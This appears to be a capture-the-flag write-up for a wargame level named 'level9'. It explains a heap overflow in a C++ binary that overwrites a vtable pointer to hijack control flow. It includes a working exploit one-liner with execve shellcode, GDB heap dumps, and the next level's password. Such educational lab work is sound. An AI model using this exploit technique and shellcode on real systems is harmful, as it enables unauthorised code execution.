# level9

First, we decompile the binary using Ghidra. Two functions stand out immediately: `main` and `setAnnotation`.

Inside `main`, the program allocates two objects of type `N` consecutively on the heap (108 bytes each via `operator_new(0x6c)`), constructs them with values 5 and 6, copies `argv[1]` into the first object via `setAnnotation`, and then calls a virtual method on the second object, passing the first object as an argument.

Here is the decompiled C++ code:
```cpp
void main(int param_1, int param_2)
{
  N *this;
  N *this_00;

  if (param_1 < 2) {
    _exit(1);
  }
  this = operator_new(0x6c);
  N::N(this, 5);
  this_00 = operator_new(0x6c);
  N::N(this_00, 6);
  N::setAnnotation(this, *(char **)(param_2 + 4));
  (*(code *)**(undefined4 **)this_00)(this_00, this);
  return;
}
```

The `setAnnotation` function copies the argument into `this + 4` using `memcpy` without performing bounds checks:
```cpp
void __thiscall N::setAnnotation(N *this, char *param_1)
{
  size_t __n;

  __n = strlen(param_1);
  memcpy(this + 4, param_1, __n);
  return;
}
```

### Vulnerability Identification

From this analysis, we identify three key facts:

1. The `memcpy` in `setAnnotation` copies `strlen(param_1)` bytes without checking the bounds. This is our overflow vector. Whatever we pass as `argv[1]` gets written into the heap starting at `this + 4`.
2. We have full control over `argv[1]`.
3. The program creates two `N` objects in sequence. Since they are allocated consecutively on the heap, the second object sits immediately after the first. A large enough write into the first object will overflow into the second object.

### Locating the Objects in Memory

To confirm the heap layout, we disassemble `main` in GDB and set breakpoints right after each `operator_new` call (specifically at the instructions where the return value `eax` is moved into `ebx`):
```assembly
0x0804861c <+40>:  mov %eax,%ebx    ; <- object 1 address
...
0x0804863e <+74>:  mov %eax,%ebx    ; <- object 2 address
```

Reading the value of `eax` at each breakpoint gives the heap addresses:
- Object 1: `0x0804a008` (constructed with value 5)
- Object 2: `0x0804a078` (constructed with value 6)

The distance between them is `0x0804a078 - 0x0804a008 = 0x70 = 112` bytes, which matches the allocation size of `0x6c` (108 bytes) plus 4 bytes of heap metadata. The two objects sit back-to-back in memory.

### Inspecting the Heap

We set a breakpoint at `main+136` (just after `setAnnotation` returns, before the virtual call) and run the binary with `./level9 AAAA`. Examining the heap from `0x0804a008`:
```text
0x0804a008:  0x08048848  0x41414141  0x00000000  0x00000000
...
0x0804a068:  0x00000000  0x00000000  0x00000005  0x00000071
0x0804a078:  0x08048848  0x00000000  0x00000000  0x00000000
...
0x0804a0d8:  0x00000000  0x00000000  0x00000006  0x00020f21
```

Our `AAAA` payload (`0x41414141`) landed at `0x0804a00c` (which is `this + 4`).
Both objects start with `0x08048848`, which is the vtable pointer sitting at offset 0.

When the virtual call executes, it reads the vtable pointer from offset 0 of object 2, dereferences it to find the function pointer, and jumps there. If we overwrite this vtable pointer, we can hijack control flow.

### Exploit Plan and Execution

We want to overwrite object 2's vtable pointer so that when the virtual call fires, execution lands in memory we control.

The write starts at `0x0804a00c` (object 1 + 4). Object 2's vtable pointer sits at `0x0804a078`. The distance between them is `0x0804a078 - 0x0804a00c = 108` bytes.

To execute the exploit:
- **Fake vtable pointer (4 bytes)**: We place `0x0804a010` (address of our shellcode) at `0x0804a00c`.
- **Shellcode (21 bytes)**: Standard execve shellcode placed at `0x0804a010`.
- **Padding**: 83 bytes of padding to reach exactly 108 bytes.
- **Overwrite target**: `0x0804a00c` to overwrite object 2's vtable pointer.

When the virtual call executes, it reads the vtable pointer from object 2 (`0x0804a00c`), dereferences it to get the function pointer (`0x0804a010`), and jumps straight into our shellcode.

Using `[::-1]` to reverse target addresses, we run the exploit:
```bash
./level9 $(python -c 'print "\x08\x04\xa0\x10"[::-1] + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*83 + "\x08\x04\xa0\x0c"[::-1]')
```

This spawns a shell as the `bonus0` user:
```bash
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
